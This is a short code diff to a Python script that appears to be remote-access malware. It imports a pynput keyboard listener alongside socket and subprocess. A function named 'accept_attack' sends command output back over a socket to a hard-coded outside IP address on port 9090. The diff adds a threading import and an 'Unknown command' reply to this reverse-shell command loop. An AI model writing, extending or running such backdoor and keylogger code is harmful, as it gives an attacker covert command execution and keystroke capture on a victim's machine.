@@ -1,6 +1,7 @@
 import socket
 import time
 import datetime
+import threading
 import os
 import subprocess
 from pynput.keyboard import Listener
@@ -87,6 +88,8 @@ def accept_attack(ip, port):
                 output_string = str(output_bytes, "cp866")
 
                 sock.send(output_bytes)
+        else:
+            sock.send(b"Unknown command")
     sock.close()
 
 accept_attack("109.237.25.179", 9090)
